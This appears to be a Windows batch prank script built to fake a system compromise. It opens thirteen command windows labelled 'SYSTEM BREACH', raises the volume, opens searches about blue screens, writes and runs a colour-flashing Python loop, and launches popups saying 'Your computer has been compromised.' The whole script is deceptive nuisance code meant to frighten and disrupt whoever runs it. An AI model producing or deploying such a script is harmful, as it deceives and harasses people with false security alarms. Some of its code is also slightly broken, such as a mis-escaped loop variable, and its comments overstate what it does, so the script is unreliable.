@echo off
title SYSTEM CRITICAL ERROR
color 04

:: 1. Open 13 Command Prompt windows with random colors and titles
FOR /L %%i IN (1,1,13) DO (
    start cmd /k "color 0%i & title SYSTEM BREACH %%i & echo WARNING: SYSTEM CORRUPTED %%i & timeout /t 999 >nul"
)

:: 2. Annoy the user with system beeps and max volume tricks
echo Forcing audio output...
powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1

:: 3. Open multiple browser windows to random search queries
start https://www.google.com/search?q=how+to+fix+blue+screen+of+death
start https://www.google.com/search?q=why+is+my+computer+beeping

:: 4. Write and execute the Python screen-glitch script
echo import os, random, time > screen_glitch.py
echo while True: >> screen_glitch.py
echo     colors = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', '0C', '0D', '0E', '0F'] >> screen_glitch.py
echo     os.system('color ' + random.choice(colors)) >> screen_glitch.py
echo     time.sleep(0.1) >> screen_glitch.py

:: Run the python script in a new minimized window
start /min python screen_glitch.py

:: 5. Endless pop-up message loops using VBScript
echo X=MsgBox("Your computer has been compromised.", 16, "CRITICAL ERROR") > popup.vbs
FOR /L %%i IN (1,1,5) DO (
    start wscript popup.vbs
)

echo Chaos initiated. Close the command windows or press Ctrl+C to stop.
pause >nul
